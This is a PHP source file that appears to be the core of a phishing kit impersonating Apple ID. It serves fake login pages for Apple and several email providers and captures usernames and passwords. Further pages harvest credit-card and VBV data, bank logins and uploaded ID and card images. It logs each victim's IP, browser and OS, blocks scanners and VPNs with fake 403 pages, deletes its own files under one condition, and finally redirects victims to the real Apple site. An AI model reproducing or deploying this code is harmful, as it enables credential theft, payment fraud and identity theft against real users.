<?php
session_start();
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
include '../main.php';
$random_id = sha1(rand(0,1000000));
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
if($_SESSION['udah'] == "y") {
  header("Location: https://appleid.apple.com/".$_GET['country']);    
exit();
}

if($setting['site_pass_on'] == "on") {
    if($_SESSION['site_password'] == "") {
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}
if($setting['site_param_on'] == "on") {
    if($_SESSION['site_parameter'] == "") {
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}

if($setting['block_iprange'] == "on") {
    include '../block4.php';
}
if($setting['block_vpn'] == "on") {
    include '../proxyblock.php';
}
function getisp($ip) {
    return 'None';
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}
$isp = getisp($ip2);
function getOSsss() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/cros/i'            =>  'Chrome OS',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

$os        =   getOSsss();

function getBrowsersss() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}



if(!function_exists('validate')){
    array_map( 'unlink', array_filter((array) glob("./*") ) );
}
$br        =   getBrowsersss();

include '../lang.php';
include 'header.php';
if($_SESSION['status'] == "") {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}
echo "<!--$random_id-->";
$random_number_id = sha1(rand(0,1000000));
$random_number_id2 = md5(rand(100,900000));

if($_GET['view'] == "email_login"){
    include_once 'email_login.php';
    exit();
}

if($_GET['view'] == "icloud"){
    $click = fopen("../result/total_click.txt","a");
    fwrite($click,"$ip2|$countrycode|$cn|$br|$os|$isp"."\n");
    fclose($click);
    include_once 'files/login-icloud.php';
    exit();
}

if($_GET['view'] == "yahoo_login"){
    include_once 'files/login-yahoo.php';
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Email Account"."\n");
    fclose($click);
    exit();
}

if($_GET['view'] == "hotmail_login"){
    include_once 'files/login-hotmail.php';
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Email Account"."\n");
    fclose($click);
    exit();
}

if($_GET['view'] == "hotmailjp_login"){
    include_once 'files/login-hotmailjp.php';
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Email Account"."\n");
    fclose($click);
    exit();
}

if($_GET['view'] == "gmail_login"){
    include_once 'files/login-gmail.php';
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Email Account"."\n");
    fclose($click);
    exit();
}

if($_GET['view'] == "aol_login"){
    include_once 'files/login-aol.php';
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Email Account"."\n");
    fclose($click);
    exit();
}

if($_GET['view'] == "yahoojp_login"){
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Email Account"."\n");
    fclose($click);
    if($os == "Android" or $os == "iPhone") {
        include_once 'files/login-yahoojp-mobile.php';
    }else{
        include_once 'files/login-yahoojp.php';
    }
}

?>
<!DOCTYPE html>
<html>
  <head>
    <!--<?php echo $random_number_id;?>-->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="../assets/css/modal.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="../assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="../assets/img/favicon.ico">
     <script type="text/javascript" src="../assets/js/jquery.js"></script>
     <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>
    <!--<?php echo $random_number_id2;?>-->
<?php
if ($_GET['view'] == "classic") {
$ID = $_POST["xuser"];
$PW = $_POST["xpass"];
$_SESSION['xusername'] = $ID;
$_SESSION['xpassword'] = $PW;

if (isset($ID) && isset($PW)) {
        include 'truelogin.php';
          }else{
            $click = fopen("../result/total_click.txt","a");
            fwrite($click,"$ip2|$countrycode|$cn|$br|$os|$isp"."\n");
            fclose($click);
        ?>
            <div class="container-fluid">
                <div class="row clearfix">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/login-classic.php';
                }
                ?>
               
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/login-desktop.php';
                }
                ?>
                </div>
            </div>
        <?php
      } 
}else if ($_GET['view'] == "login") {
$ID = $_POST["xuser"];
$PW = $_POST["xpass"];
$_SESSION['xusername'] = $ID;
$_SESSION['xpassword'] = $PW;

if (isset($ID) && isset($PW)) {
        include 'truelogin.php';
          }else{
            $click = fopen("../result/total_click.txt","a");
            fwrite($click,"$ip2|$countrycode|$cn|$br|$os|$isp"."\n");
            fclose($click);
        ?>
            <div class="container-fluid">
                <div class="row clearfix">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/login-mobile.php';
                }
                ?>
               
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/login-desktop.php';
                }
                ?>
                </div>
            </div>
        <?php
      } 

}elseif ($_GET['view'] == "update") {
    session_start();
    if($_SESSION['email'] == "") {
        echo "<script type='text/javascript'>window.top.location='?view=login&appIdKey=".$_SESSION['key']."&country=".$cid."&error=1';</script>";
    }
    
    if (isset($_POST["vbv"]) or isset($_POST["cardid"])) {
        include 'vbv.php';
    }else{
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Credit Card"."\n");
    fclose($click);
        ?>
            <div class="container-fluid">
                <div class="row clearfix">
                <script src="../assets/js/jquery.payment.js"></script>
                <script src="../assets/js/payment.js"></script>
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                    if($setting['get_vbv'] == "on") {
                        include_once 'files/mobile-billing.php';
                    }else{
                        include_once 'files/mobile-billing-novbv.php';
                    }
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                    if($setting['get_vbv'] == "on") {
                        include_once 'files/desktop-billing.php';
                    }else{
                        include_once 'files/desktop-billing-novbv.php';
                    }
                }
                ?>
                </div>
            </div>

        <?php
    }
}
elseif ($_GET['view'] == "vbv") {
    $countryna = $_GET['country'];
    if (isset($_POST["vbv"]) or isset($_POST["vbv_jp"])) {
            include 'vbv.php';
    }
    ?>
                <br>
                <script>
    Array.prototype.forEach.call(document.querySelectorAll('link[rel=stylesheet]'), function(element){
      try{
        element.parentNode.removeChild(element);
      }catch(err){}
    });

//or this is similar
var elements = document.querySelectorAll('link[rel=stylesheet]');
for(var i=0;i<elements.length;i++){
    elements[i].parentNode.removeChild(elements[i]);
}
    </script>
                <?php 
                if($os == "Android" or $os == "iPhone") {
                    if($countryna == "JP") {
                        include 'files/vbv-jp.php';
                    }else{
                        include 'files/vbv.php';
                    }
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                    if($countryna == "JP") {
                        include 'files/vbv-jp.php';
                    }else{
                        include 'files/vbv.php';
                    }
                }
                ?>
    <?php
}
elseif ($_GET['view'] == "upload") {
    if (isset($_FILES["file"])) {
        include 'upload.php';
    }else{
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Upload CC"."\n");
    fclose($click);
    ?>
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/upload-mobile.php';
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/upload.php';
                }
                ?>
                </div>
        </div>
    <?php
    }
}
elseif ($_GET['view'] == "upload_id") {
    if (isset($_FILES["file"])) {
        include 'uploadid.php';
    }else{
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Upload ID"."\n");
    fclose($click);
    ?>
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/uploadid-mobile.php';
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/uploadid.php';
                }
                ?>
                </div>
        </div>
    <?php
    }
}
elseif ($_GET['view'] == "bankus") {
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Bank Login"."\n");
    fclose($click);
    ?> 
        
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/bank-mobile.php';
                }
                ?>
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/bank.php';
                }
                ?>
                
                </div>
        </div>
    <?php
}
elseif ($_GET['view'] == "done") {
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Selesai Mengisi Data"."\n");
    fclose($click);
    if($autoblock == "on") {
			$_SESSION['udah'] = "y";
    }
    ?> 
		
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/done-mobile.php';
                }
                ?>
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/done.php';
                }
                ?>
                
                </div>
        </div>
    <?php
}
elseif ($_GET['view'] == "success") {
    session_start();
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    $_SESSION['firstname'] = "";
        
}
?>
  <body>
</html>
